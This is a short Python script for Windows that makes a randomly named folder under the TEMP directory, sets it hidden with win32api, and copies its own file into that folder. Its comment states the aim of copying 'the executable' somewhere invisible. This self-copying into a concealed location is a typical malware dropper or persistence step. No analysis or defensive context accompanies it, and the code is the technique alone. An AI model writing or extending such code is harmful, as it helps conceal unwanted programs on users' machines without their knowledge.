import os
import shutil
from random import randint
import win32con, win32api

#Copies the executable to a generated dir, and makes the folder invisible
drop_path = os.environ.get('TEMP') + "\\.tmp" + str(randint(0, 99999))


os.makedirs(drop_path)

#Makes folder/file invisible
win32api.SetFileAttributes(drop_path,win32con.FILE_ATTRIBUTE_HIDDEN)

print(drop_path)
shutil.copy(__file__, drop_path)